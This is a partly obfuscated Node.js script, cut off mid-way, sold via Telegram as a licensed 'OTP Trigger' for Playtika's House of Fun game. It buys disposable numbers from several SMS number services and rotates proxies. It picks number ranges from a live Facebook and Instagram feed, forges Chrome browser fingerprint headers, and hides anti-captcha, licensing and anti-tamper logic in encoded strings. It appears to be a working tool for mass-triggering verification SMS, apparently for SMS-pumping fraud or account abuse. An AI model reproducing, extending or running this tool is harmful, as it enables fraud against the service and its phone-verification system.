const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (v29) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] First time setup: Installing required dependencies...");
    try {
      const v30 = {};
      v30.stdio = "inherit", execSync("npm install https-proxy-agent socks-proxy-agent chalk@4", v30), console.log("[SETUP] Dependencies installed successfully!\n");
    } catch (v31) {
      console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly."), process.exit(0x1);
    }
  }
}
const http = require("http"),
  https = require("https"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  readline = require("readline"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent");
function debugLog(v32, v33, v34) {}
const B = chalk.hex("#9B59B6"),
  C = chalk.hex("#F1C40F"),
  Y = chalk.hex("#E67E22"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF4466"),
  DIM = chalk.hex("#555555");
function printHeader() {
  process.stdout.write("[2J[3J[H"), console.log(B("  ██╗  ██╗ ██████╗ ███████╗")), console.log(B("  ██║  ██║██╔═══██╗██╔════╝")), console.log(C("  ███████║██║   ██║█████╗  "));
  console.log(C("  ██╔══██║██║   ██║██╔══╝  ")), console.log(Y("  ██║  ██║╚██████╔╝██║     ")), console.log(Y("  ╚═╝  ╚═╝ ╚═════╝ ╚═╝   ")), console.log(W("                   ") + B("House of Fun") + W(" — Playtika\n"));
  console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Author    : ") + B("NOT REXY                     ") + W('│')), console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│')), console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│'));
  console.log(W("│ [•] Target    : ") + Y("House of Fun — OTP Trigger   ") + W('│')), console.log(W("│ [•] Version   : ") + B("HOF-V1.0.0                   ") + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
}
class NexaRateLimiter {
  constructor(v35) {
    this.delayMs = v35, this.queue = [];
    this.processing = false;
  }
  ["enqueue"](v36) {
    return new Promise((v37, v38) => {
      this.queue.push(async () => {
        try {
          v37(await v36());
        } catch (v39) {
          v38(v39);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0x0) {
      const v40 = this.queue.shift();
      await v40(), await new Promise(v41 => setTimeout(v41, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(0x1f4),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt");
const SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v42) {
  return new Promise((v43, v44) => {
    const v45 = {};
    v45.Accept = "text/plain", v45.Connection = "close";
    const v46 = {};
    v46.hostname = "smsbower.page";
    v46.port = 0x1bb;
    v46.path = "/stubs/handler_api.php?" + v42, v46.method = "GET", v46.headers = v45;
    const v47 = v46,
      v48 = https.request(v47, v49 => {
        let v50 = '';
        v49.on("data", v51 => v50 += v51);
        v49.on("end", () => v43(v50.trim()));
      });
    v48.on("error", v52 => v44(new Error("SmsBower net: " + v52.message))), v48.setTimeout(0x3a98, () => {
      v48.destroy();
      v44(new Error("SmsBower timeout"));
    }), v48.end();
  });
}
function smsBowerFetchNumber(v53, v54, v55, v56) {
  let v57 = "api_key=" + encodeURIComponent(v53) + "&action=getNumber&service=" + encodeURIComponent(v54 || 'fb');
  if (v55 && String(v55).trim() !== '0' && String(v55).trim() !== '') v57 += "&country=" + encodeURIComponent(v55);
  if (v56 && parseFloat(v56) > 0x0) v57 += "&maxPrice=" + encodeURIComponent(v56);
  return smsBowerRequest(v57).then(v58 => {
    if (v58.startsWith("ACCESS_NUMBER:")) {
      const v59 = v58.split(':');
      return {
        'activationId': v59[0x1],
        'phoneNumber': v59[0x2].replace(/[^0-9]/g, '')
      };
    }
    throw new Error("SmsBower: " + v58);
  });
}
const ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function zenexFetchNumber(v60, v61) {
  return new Promise((v62, v63) => {
    const v64 = {};
    v64.range = v61, v64.is_national = false, v64.remove_plus = false;
    const v65 = JSON.stringify(v64),
      v66 = {
        'hostname': "api.zenexnetwork.com",
        'port': 0x1bb,
        'path': "/v1/getnum",
        'method': "POST",
        'headers': {
          'mapikey': v60,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v65)
        }
      },
      v67 = https.request(v66, v68 => {
        let v69 = '';
        v68.on("data", v70 => v69 += v70), v68.on("end", () => {
          try {
            const v71 = JSON.parse(v69);
            if (v71?.["meta"]?.["code"] === 0xc8 && v71?.["data"]?.["full_number"]) v62(v71.data.full_number.replace(/[^0-9]/g, ''));else v63(new Error(v71?.["message"] || "Zenex: no number"));
          } catch (v72) {
            v63(new Error("Zenex: invalid JSON"));
          }
        });
      });
    v67.on("error", v73 => v63(new Error("Zenex net: " + v73.message))), v67.setTimeout(0x3a98, () => {
      v67.destroy();
      v63(new Error("Zenex timeout"));
    });
    v67.write(v65), v67.end();
  });
}
const twoOoLimiter = new NexaRateLimiter(0x1f4);
function stripRid(v74) {
  return v74.replace(/X+$/i, '').trim();
}
function twoOoFetchNumber(v75, v76, v77) {
  return new Promise((v78, v79) => {
    const v80 = stripRid(v76),
      v81 = {};
    v81.rid = v80;
    const v82 = JSON.stringify(v81);
    const v83 = {
        'hostname': "api.2oo9.cloud",
        'port': 0x1bb,
        'path': v77,
        'method': "POST",
        'headers': {
          'mauthapi': v75,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v82)
        }
      },
      v84 = https.request(v83, v85 => {
        let v86 = '';
        v85.on("data", v87 => v86 += v87), v85.on("end", () => {
          try {
            const v88 = JSON.parse(v86);
            if (v88?.["meta"]?.["code"] === 0xc8 && v88?.["data"]?.["no_plus_number"]) v78(v88.data.no_plus_number);else v79(new Error(v88?.["message"] || v88?.["meta"]?.["status"] || "2oo9: No number"));
          } catch (v89) {
            v79(new Error("2oo9: Invalid JSON"));
          }
        });
      });
    v84.on("error", v90 => v79(new Error("2oo9 network: " + v90.message))), v84.setTimeout(0x2710, () => {
      v84.destroy();
      v79(new Error("2oo9: Timeout"));
    }), v84.write(v82), v84.end();
  });
}
function twoOoFetchConsole(v91, v92) {
  return new Promise((v93, v94) => {
    const v95 = {};
    v95.mauthapi = v91;
    const v96 = {};
    v96.hostname = "api.2oo9.cloud";
    v96.port = 0x1bb, v96.path = v92, v96.method = "GET";
    v96.headers = v95;
    const v97 = v96,
      v98 = https.request(v97, v99 => {
        let v100 = '';
        v99.on("data", v101 => v100 += v101), v99.on("end", () => {
          try {
            const v102 = JSON.parse(v100);
            if (v102?.["meta"]?.["code"] === 0xc8 && Array.isArray(v102?.["data"]?.["hits"])) v93(v102.data.hits);else v94(new Error(v102?.["message"] || "Console fetch failed"));
          } catch (v103) {
            v94(new Error("Console: Invalid JSON"));
          }
        });
      });
    v98.on("error", v104 => v94(new Error("Console network: " + v104.message))), v98.setTimeout(0x2710, () => {
      v98.destroy();
      v94(new Error("Console timeout"));
    });
    v98.end();
  });
}
function parseTwoOoRangeSelection(v105, v106) {
  const v107 = new Set();
  const v108 = v105.split(/[\s,]+/).filter(v109 => v109);
  for (const v110 of v108) {
    const v111 = v110.match(/^(\d+)-(\d+)$/);
    if (v111) for (let v112 = +v111[0x1]; v112 <= +v111[0x2]; v112++) {
      if (v112 >= 0x1 && v112 <= v106) v107.add(v112 - 0x1);
    } else {
      const v113 = parseInt(v110);
      if (!isNaN(v113) && v113 >= 0x1 && v113 <= v106) v107.add(v113 - 0x1);
    }
  }
  return [...v107].sort((v114, v115) => v114 - v115);
}
async function autoRangeFinderFor2Oo(v116, v117, v118, v119) {
  const v120 = {};
  v120.facebook = ["facebook", 'fb'], v120.instagram = ["instagram", 'ig'], v120.meta = ["meta"], v120.all = ["facebook", 'fb', "instagram", 'ig', "meta", "playtika", "hof"];
  const v121 = v120;
  const v122 = {};
  v122.facebook = "📘 Facebook", v122.instagram = "📸 Instagram", v122.meta = "🌐 Meta", v122.all = "📦 All";
  const v123 = v122;
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v124 = [];
  try {
    v124 = await twoOoFetchConsole(v116, v117);
  } catch (v135) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v135.message + '\x0a')), null;
  }
  const v125 = v124.slice(0x0, 0x64);
  if (v125.length === 0x0) return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  const v126 = await v118("Filter by app:", [{
      'name': "📘 Facebook",
      'value': "facebook"
    }, {
      'name': "📸 Instagram",
      'value': "instagram"
    }, {
      'name': "🌐 Meta",
      'value': "meta"
    }, {
      'name': "📦 All",
      'value': "all"
    }]),
    v127 = v121[v126],
    v128 = v125.filter(v136 => {
      const v137 = (v136.sid || '').toLowerCase(),
        v138 = (v136.message || '').toLowerCase();
      return v127.some(v139 => v137.includes(v139) || v138.includes(v139));
    });
  if (v128.length === 0x0) return console.log(chalk.red("\n  ✗ No hits for selected app.\n")), null;
  const v129 = {},
    v130 = {};
  for (const v140 of v128) {
    const v141 = v140.range || '';
    if (!v141) continue;
    v129[v141] = (v129[v141] || 0x0) + 0x1;
    const v142 = {};
    v142.facebook = 0x0, v142.instagram = 0x0, v142.meta = 0x0, v130[v141] = v130[v141] || v142;
    if (v121.facebook.some(v143 => (v140.sid || '').toLowerCase().includes(v143) || (v140.message || '').toLowerCase().includes(v143))) v130[v141].facebook++;
    if (v121.instagram.some(v144 => (v140.sid || '').toLowerCase().includes(v144) || (v140.message || '').toLowerCase().includes(v144))) v130[v141].instagram++;
    if (v121.meta.some(v145 => (v140.sid || '').toLowerCase().includes(v145) || (v140.message || '').toLowerCase().includes(v145))) v130[v141].meta++;
  }
  const v131 = Object.entries(v129).sort((v146, v147) => v147[0x1] - v146[0x1]).slice(0x0, 0x5);
  if (v131.length === 0x0) return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  const v132 = {};
  v132.name = "⚡ Auto detect & send (#1 range)", v132.value = "auto";
  const v133 = {};
  v133.name = "📊 Show top 5 & select", v133.value = "select";
  const v134 = await v118("Range Finder mode:", [v132, v133]);
  if (v134 === "auto") {
    const [v148, v149] = v131[0x0],
      v150 = v130[v148] || {},
      v151 = [];
    if (v150.facebook) v151.push("📘FB(" + v150.facebook + ')');
    if (v150.instagram) v151.push("📸IG(" + v150.instagram + ')');
    if (v150.meta) v151.push("🌐Meta(" + v150.meta + ')');
    return console.log(chalk.green("\n  ✓ Auto Range: " + v148 + "  (" + v149 + " hits)  " + v151.join('\x20') + '\x0a')), [v148];
  } else {
    console.log(chalk.cyan("\n  App: " + v123[v126] + "  |  Scanned: " + v128.length + " hits\n")), console.log(chalk.yellow("  #   Range              Hits  Apps")), console.log(chalk.gray("  ─".repeat(0x16))), v131.forEach(([v155, v156], v157) => {
      const v158 = v130[v155] || {},
        v159 = [];
      if (v158.facebook) v159.push("📘FB(" + v158.facebook + ')');
      if (v158.instagram) v159.push("📸IG(" + v158.instagram + ')');
      if (v158.meta) v159.push("🌐Meta(" + v158.meta + ')');
      console.log(chalk.cyan('\x20\x20' + String(v157 + 0x1).padEnd(0x3) + '\x20') + chalk.green(v155.padEnd(0x10)) + chalk.yellow(String(v156).padEnd(0x5)) + chalk.gray('█'.repeat(Math.min(v156, 0xc)) + '\x20\x20') + (v159.join('\x20') || chalk.gray('?')));
    }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
    const v152 = await v119("Select ranges:", ''),
      v153 = parseTwoOoRangeSelection(v152, v131.length);
    if (v153.length === 0x0) return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
    const v154 = v153.map(v160 => v131[v160][0x0]);
    return console.log(chalk.green("\n  ✓ Selected: " + v154.join(',\x20') + '\x0a')), v154;
  }
}
function nexaFetchNumber(v161, v162, v163) {
  return new Promise((v164, v165) => {
    const v166 = {};
    v166.range = v162, v166.format = "normal";
    const v167 = JSON.stringify(v166),
      v168 = {
        'hostname': "nexaotpservice.com",
        'port': 0x50,
        'path': v163 || "/api/v1/numbers/get",
        'method': "POST",
        'headers': {
          'X-API-Key': v161,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v167)
        }
      },
      v169 = http.request(v168, v170 => {
        let v171 = '';
        v170.on("data", v172 => v171 += v172);
        v170.on("end", () => {
          try {
            const v173 = JSON.parse(v171);
            if (v173.success && v173.number) v164(v173.number.replace(/[^0-9]/g, ''));else v165(new Error(v173.error || "NexaOTP: No number returned"));
          } catch (v174) {
            v165(new Error("NexaOTP: Invalid response"));
          }
        });
      });
    v169.on("error", v175 => v165(new Error("NexaOTP network: " + v175.message))), v169.setTimeout(0x2710, () => {
      v169.destroy();
      v165(new Error("NexaOTP: Timeout"));
    });
    v169.write(v167);
    v169.end();
  });
}
function normalizePhoneNumber(v176) {
  let v177 = v176.trim();
  if (!v177.startsWith('+')) v177 = '+' + v177;
  return v177;
}
const v1 = {};
v1.v = 0x7e, v1.buildMin = 0x194e, v1.buildMax = 0x1984, v1.grease = "\"Not/A)Brand\";v=\"8\"";
const v2 = {};
v2.v = 0x7f, v2.buildMin = 0x1985, v2.buildMax = 0x19d4, v2.grease = "\"Not)A;Brand\";v=\"99\"";
const v3 = {};
v3.v = 0x80, v3.buildMin = 0x19d5, v3.buildMax = 0x1a0b, v3.grease = "\"Not;A=Brand\";v=\"8\"";
const v4 = {};
v4.v = 0x81, v4.buildMin = 0x1a0c, v4.buildMax = 0x1a42, v4.grease = "\"Not=A?Brand\";v=\"8\"";
const v5 = {};
v5.v = 0x82, v5.buildMin = 0x1a43, v5.buildMax = 0x1a79, v5.grease = "\"Not?A_Brand\";v=\"99\"";
const v6 = {};
v6.v = 0x83, v6.buildMin = 0x1a7a, v6.buildMax = 0x1ab1, v6.grease = "\"Not_A Brand\";v=\"24\"";
const v7 = {};
v7.v = 0x84, v7.buildMin = 0x1ab2, v7.buildMax = 0x1b1e, v7.grease = "\"Not A(Brand\";v=\"8\"";
const v8 = {};
v8.v = 0x85, v8.buildMin = 0x1b1f, v8.buildMax = 0x1b55, v8.grease = "\"Not(A;Brand\";v=\"99\"";
const v9 = {};
v9.v = 0x86, v9.buildMin = 0x1b56, v9.buildMax = 0x1b88, v9.grease = "\"Not;A)Brand\";v=\"24\"";
const v10 = {};
v10.v = 0x87, v10.buildMin = 0x1b89, v10.buildMax = 0x1bbe, v10.grease = "\"Not)A=Brand\";v=\"8\"";
const v11 = {};
v11.v = 0x88, v11.buildMin = 0x1bbf, v11.buildMax = 0x1bee, v11.grease = "\"Not=A_Brand\";v=\"99\"";
const v12 = {};
v12.v = 0x89, v12.buildMin = 0x1bef, v12.buildMax = 0x1c23, v12.grease = "\"Not/A)Brand\";v=\"8\"";
const v13 = {};
v13.v = 0x8a, v13.buildMin = 0x1c24, v13.buildMax = 0x1c59, v13.grease = "\"Not)A;Brand\";v=\"99\"";
const v14 = {};
v14.v = 0x8b, v14.buildMin = 0x1c5a, v14.buildMax = 0x1c7d, v14.grease = "\"Not;A=Brand\";v=\"24\"";
const v15 = {};
v15.v = 0x8c, v15.buildMin = 0x1c7e, v15.buildMax = 0x1c9f, v15.grease = "\"Not=A?Brand\";v=\"8\"";
const v16 = {};
v16.v = 0x8d, v16.buildMin = 0x1ca0, v16.buildMax = 0x1cbe, v16.grease = "\"Not?A_Brand\";v=\"24\"";
const v17 = {};
v17.v = 0x8e, v17.buildMin = 0x1cbf, v17.buildMax = 0x1ce2, v17.grease = "\"Not_A Brand\";v=\"8\"";
const v18 = {};
v18.v = 0x8f, v18.buildMin = 0x1ce3, v18.buildMax = 0x1cf6, v18.grease = "\"Not A(Brand\";v=\"99\"";
const v19 = {};
v19.v = 0x90, v19.buildMin = 0x1cf7, v19.buildMax = 0x1cfd, v19.grease = "\"Not(A;Brand\";v=\"8\"";
const v20 = {};
v20.v = 0x91, v20.buildMin = 0x1cfe, v20.buildMax = 0x1d03, v20.grease = "\"Not;A)Brand\";v=\"24\"";
const v21 = {};
v21.v = 0x92, v21.buildMin = 0x1d04, v21.buildMax = 0x1d1b, v21.grease = "\"Not)A=Brand\";v=\"99\"";
const v22 = {};
v22.v = 0x93, v22.buildMin = 0x1d1c, v22.buildMax = 0x1d35, v22.grease = "\"Not=A_Brand\";v=\"8\"";
const v23 = {};
v23.v = 0x94, v23.buildMin = 0x1d36, v23.buildMax = 0x1d49, v23.grease = "\"Not/A)Brand\";v=\"24\"";
function fn1() {
  const v178 = ['jNbHz2v1CMW9', '4PQHief1Dg8Gzgv0zwn0icyGC2vUzcaOiZeGCMfUz2uP', 'uNzbD20', 'mM9VotOGvgLTzw91Da', 'q1jJt3K', 'uLzjCge', 'cIaG4PYxifnLC3nPB24GAw52ywXPzgf0zwqGyNKGC2vYDMvYlIbfEgL0Aw5NlI4UcG', 'pt09ierfqLvhifnfu1njt04G', 'Ag9ZDa', '4PYtifrHCMDLDcaGoIa', 'ue1HyNi', 'nsaGvgHYzwfKCYaGkfnSB3CG4OcuigjLC3qGD2L0AcbJyxb0y2HHignVC3qP', 'ChjVDMLKzxi', 'qKzgv3a', 'vg9YBem', 'ugTlz1O', 'CKflBfy', 'DgHYzwfKCW', 'CK1bCgm', 'iK5VDd1bx0jYyw5KiJT2psi4iG', 'yvvMC1K', 'w0vsuK9sxsbgywLSzwqGDg8GAw5ZDgfSBcbKzxbLBMrLBMnPzxmUie1HA2uGC3vYzsboB2rLlMPZigfUzcboue0GyxjLigLUC3rHBgXLzcbWCM9WzxjSEs4', 'mKnHChrJAgeGzxjYB3i6ia', 'ExjHqwu', 'yND2D2e', 'vKHMEMC', 'vgP3rhq', 'Exjxz20', 'q0vAt00', 'AwnmuK0', 'ndy3nJe5Cxf3vKP1', 'rw50zxiGuhjVEgLLCYbgAwXLifbHDgG6', 'r0vu', 'rfbxy1G', '8j+tGsbmB2fKigzYB20GzMLSzsaOBNvTyMvYCY50EhqP', 't1LQDNi', 'DxnL', 'qu5lsu5hlq', 'AgvHzgvYCW', 'wg1izgO', 'zNvUy3rPB24GkLWOicPCkq', 'u0vmrunuifrbuKDfvcbovu1crvjtiezjteu', 'Ag9ZDg5HBwu', 'zgvZDhjVEq', 'EwzyBwq', 'iK5VDf9biejYyw5KiJT2psiYnci', 'cIaG4PYxifvWzgf0zsbYzxf1AxjLzceGugXLyxnLigrVD25SB2fKihrOzsbSyxrLC3qGDMvYC2LVBI4k', 'B0zZEu8', 'C3rLEa', 'DhDVt29dB25MAwC', 'C3rHCNrZv2L0Aa', 'xsdINjCGtM8GBNvTyMvYCYbMzxrJAgvKlIbmyxn0oIa', 'zNr4q08', 'DNDYuLi', 'y3b1CW', 'yMfUBMvK', 'rMLSDgvYigj5igfWCdO', 'tw9MwKe', 'AM9PBG', 'oIbdyxb0y2HHoIa', 'ywnJzxb0lwvUy29KAw5N', '4PQHief1Dg8GzMv0y2GGzNjVBsbAzw5LEa', 'EwvpEwq', 'uuzHsM0', 'icdILzeGifn0yxr1CYa6ia', 'ywrK', 'D013yKm', 'ue9tva', 'De1dA0u', 's3nhteW', 'nZmWmtaWsLHRvgn0', 'vePeu2K', 'rw50zxiGBMv3igTLEq', 'z0LkwNG', 'DwjIuhm', 'rvHYsw0', 'su5ZCuG', 'zeTWuMq', 'z3PPCa', '4Psu4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4PsycG', '4PYtieXVywrLzca', 'ALfVCwO', 'C3rHDgvpyMPLy3q', 'icbqCM94AwvZigXVywrLzdOG', 'iefqssblzxKGkg1HDxrOyxbPktO', 'Eef3BM0', 'tgrxt1K', 're1itNO', 't3Djy1u', 'D0XAs3K', 'icdILOJILOJILztILzdILzdILOJILOJILzhILOJILOJILzeGicdILOJILOJILzhILOJILOJILztILzdILzdILz0Gia', 'lM5LEgfFyxbPx2TLEq', 'z2Dtwuq', 'teP0qLO', 'wMvUzxG6igLUDMfSAwqGsLnptG', 'l2fWAs92zxjPzNK', 'Cg9W', 'twf4ihbYAwnLihbLCIbUDw1IzxiGw2rLzMf1Bhq6idaUnv06', 'whr3u1K', 'u1zXsK8', 't1rssha', 'CLH2yKC', 'vNf0qwq', 'C3vJy2vZC2z1Bc50Ehq', 'thjJuve', '8j+uKsaYq2fWDgnOysaGicGYy2fWDgnOys5JB20P', 'rfvHCNu', 'icdILzeGieHxsuqGica6ia', 'mKnHChrJAgeGDgLTzw91DcaOmtiWCYK', 'BwfW', '8j+mKcbnzxrH', 's1zTBMq', 'Ahr0Chm6lY9HCgKUyw50As1Jyxb0y2HHlMnVBs9JCMvHDgvuyxnR', 'CfrxC2S', 'AMjqC1y', 'iKXPBNv4iG', 'cIaG4PYxienssvrjq0fmoIbsDw50Aw1Lig1LBw9YEsbPBMPLy3rPB24Gzgv0zwn0zwqUieHxsuqGBwLZBwf0y2GUiefIB3j0Aw5NlI4UcG', 'icdILze', 'ugXks3y', '4QYf77IpieDViejHy2SGDg8GqvbjieTLEq', 'C29JA3m1', 'ms4WlJa', 'Bwv0Ag9K', 'ywDLBNq', 'Bwv0yq', 'oIbBms8YxsbtB2X2Aw5NignHChrJAgeUlI4', 'CMLK', 'uwLjq3O', 'D3v0ENi', 'CNjVBxe', 'AMvezK4', 'AuXAA3a', 'C3bSAwnL', 'BMv4yunVBMzPzW', 'vfrpCwG', 'mtaGvgHYzwfKCW', 'g1SYsHTBm0OBw0G', 'DxrMoa', 'EMvUzxHdB25MAwC', 'C2vJlwzLDgnOlw1Vzgu', 'zg93BG', 'rfLZtge', 'A25ItxG', 'u21ZqM93zxiGDgLTzw91Da', 'zM9YBwf0', 'y2fWDgnOyuTLEq', 'shj4u00', 'we1Ltg4', 'y3LTELO', 'DuHRzKi', 'u0vmrunuie5fweeGu0vsvKvs', 'qZPCv2LUzg93C1XtExn0zw0ZmLXxAw5KB3DZug93zxjtAgvSBfX2ms4WxhbVD2vYC2HLBgWUzxHLic1oB1bYB2zPBguGlunVBw1HBMqGiG', 'wMvUzxGGBMv0oIa', '8j+tIIbtAg93ihrVCca1icyGC2vSzwn0', 'C21wAMK', 'zeLyt1C', 's1fcrgW', 'mJaGvgHYzwfKCYaOrgvMyxvSDcK', 'u21ZqM93zxi6ia', 'CgfYC2u', 'EMXnque', 'q29UC29SztOGsw52ywXPzcbku09o', 'v25mCxq', 'Dw5SAw5Ru3LUyW', 'sxzxDLO', 'vLn3tvK', 'vhrdC2G', 'vxv2Dfy', 'Ahr0ChmTChjVEhKTywDLBNq', 'BwPzsKK', 'g1SWBsa', 'CgLWzq', 'A3v0vMG', 'Ag9M', 'igHPDhmk', 'Dgv4Dc9WBgfPBG', 'Cgf1C2u', 'cIaG4PYxieHxsuqGAw50zwDYAxr5ignOzwnRigzHAwXLzc4GvgfTCgvYAw5NigrLDgvJDgvKlGO', 'xsdINjCGsw5ZDwzMAwnPzw50igjHBgfUy2uUcG', 'q21YChG', 'C3vIC3rYAw5N', 'zxjYB3i', 'sfruuca', 'q29UDgvUDc1uExbL', 'lI4Ukq', 'rfPYzgq', 'cIaG4PYxierPC2nVBM5Ly3rLzcbMCM9TieXPy2vUC2uGu2vYDMvYlIbfEgL0Aw5NlI4UcG', 'z3jHEq', 'mta1m1f4s1bbuq', 'rgHmtfO', 'zgn1u2C', 'ihjHBMDLkhmPlIbbzgqGyw5VDgHLCJ8', 'y2HHBgS', 'CxvLDwu', '4PscifVIGkjDifn0yxr1CYaGica6ia', 'i0zgndq2nG', 'C2v0u3rHDhvZ', 'BNvTyMvYCY50Ehq', 'DM9SDhG', 'yNjrBLO', 'jg1Nid0GkeDLDc1jDgvTuhjVCgvYDhKGj0Hlte06xfnprLrxqvjfxe1Py3jVC29MDfXdCNLWDg9NCMfWAhKNic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLks5nywnOAw5Lr3vPzdSG', 'z1Hls3q', 'cIaG4PYxienVBNnVBguGzMv0y2GGzMfPBgvKoIa', '8j+tPIbbBgW', 'BLLLtKG', 'l3bYB2mVy3b1Aw5MBW', 'cIaG4PYxieLUDgvYBMfSifnLCNzLCIbfCNjVCIaOntaWks4GugXLyxnLihrYEsbHz2fPBIbSyxrLCI4k', 'sgjIBfe', 'CMfUz2u', 'igHPDhmPica', 'DK9SCNq', 'yxbPs2v5', 'jNzLCNnPB249DJmMywn0Aw9Upq', 'Cgf0Ag5HBwu', 'yxbWx2LK', 'C2LN', 'u0vmrunuienbufrdseeGu09mvKvsicHYzunbufrdseeGrw50zxjWCMLZzsK', 'E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK', 'yK9AEhq', 'yxbWBgLJyxrPB24VANnVBG', 'Eg5XD2i', 'tK9FqunusvzbveLptG', 'iZLcntLcnG', 'y2XVC2u', 'sLj2BLm', 'y29Uy2f0', 'C2v0vgLTzw91Da', 'sfPIBvK', 'ms43lJm1', 'uK5cCuq', 'zxzMuMO', 'ywn0AxzLvue', 'zg1Hz2K', 'icHLlMCUidiXnJi0ndG1wfHyksbVCIb0ExbLicDIywnRjZO', 'iK5VDcHbo0jYyw5KiJT2psi4iG', 'ywnJzxb0lwXHBMD1ywDL', 'u0vmrunuie5vtujfuIbtt1vsq0u', 'A1b6v3C', 'tejYrxK', 'D1z1t2e', 'rvDRv04', 'zw5K', 'BMv4yw90ChnLCNzPy2uUy29T', 'yKPuBKi', 'C2fTzs1ZAxrL', 'sg93ig1HBNKGBNvTyMvYCZ8Gw2rLzMf1Bhq6ntbDoG', 'ywXS', '8j+tMezcka', 'iJeWlJe1lJCI', 'jg1Iid0GkeDLDc1dAw1jBNn0yw5JzsbxAw4ZmL9cyxnLqM9HCMqGluvYCM9Yqwn0Aw9UifnPBgvUDgX5q29UDgLUDwuPlLnLCMLHBe51BwjLCJSG', 'DgLTzxn0yw1W', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2nVBNnVBgu', 's2DLELy', 'icaJicaGuMfUz2uGicaGicaGicaGicaGieHPDhmGiefWChm', 'C29SDxrPB24', 'rMfPBgvK', 'yxbPx2TLEt0', 'zfPMwfa', 'D29YA2vYx3rOCMvHzhm', 'B25LlxP1DwWUCgXHExrPA2eUy29T', 'CgfKu3rHCNq', 'y2XPzw50s2v5', 'zxHPC3rZu3LUyW', 'DM9SDhHFA2v5lNr4Da', 'jMnVDw50CNK9', 'C2vHCMnO', 'v0zrzve', 'uvfsCxq', '4OYO77IpicbdDxn0B20UlI4', 'vxPzyLe', 'sg91C2uGB2yGrNvUiokaLcbpvfaGvhjPz2DLCIaGia', 'i0u2n0uYmG', 'qLvwz0q', 'BNvTyMvYC0zPBgu', 'Ahr0Chm6lY9HCgKUyw50As1Jyxb0y2HHlMnVBs9NzxruyxnRuMvZDwX0', 'ihrHCMDLDhm', 'u0vmrunuifbst1HjrvmGrKLmrq', 'icaGifbSzwfZzsbJAgvJAYb5B3vYigLUDgvYBMv0ignVBM5Ly3rPB24GB3iGDhj5igfNywLUigXHDgvYlGO', 'sLLSwvG', 'iK5VDcbbkejYyw5KiJT2psi4iG', 'BfPfD3a', 'qw50AunHChrJAgeGzxjYB3i6ia', 'Ahr0Chm', 'A3nZy1C', 'jMfJDgLVBJ1NzxrtDgf0DxmMAwq9', 'C2v0uMf3tw9Kzq', 'CwLLDvC', 'icdILzeGienVBNrHy3q6ihqUBwuVC2nYyxbLCL9RAw5NihrVihjLz2LZDgvYicaGicdILze', 'q291BNrYEsbJB2rLicGWid0Gyw55ksbBzgvMyxvSDdOGmf06', 'DfzmAMK', 'CMvZCg9UC2u', 'DxnLCKfNzw50', 'D2HPDgu', 'DhjPBq', 'BKv6sKe', 'zxjYB3jjza', 'DgfZA0LK', 'EgvjAgy', 'DMvYC2LVBG', 'v0jbuwi', 'ChjPB3jPDhK', 'y3rYBa', 'C3rYAw5NAwz5', 'lJaU', 'ks4GvxnLigL0pW', 'u21ZqM93zxiGBMv0oIa', 'iZG4odG4oa', 'C05VqNu', 'BwDctwu', 'ndi0vLLJz3Lo', 'tLfMrMG', 'BNvSBa', 'qxPZq1y', 'AxnuvfK', 'C21ZyM93zxiUCgfNzq', 'DhDVy2fWDgnOyq', 'C3rKAw8', 'zhDdDfy', '4Psm4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psq', 'rfrKz1C', 'se1rv1q', 'B050Afq', 'Awr0Bgi', 'CMv0DxjUicHMDw5JDgLVBIGPia', 'mM9VosbUzxr3B3jRoIa', 'Dg9Rzw4', 'qw50AunHChrJAgeGy3jLyxrLigzHAwXLzdOG', 'tM8GAgfYzhDHCMuGzgf0yq', 'uhjLBwL1BsbmAwnLBNnLicaGicaGicaGicaGica', 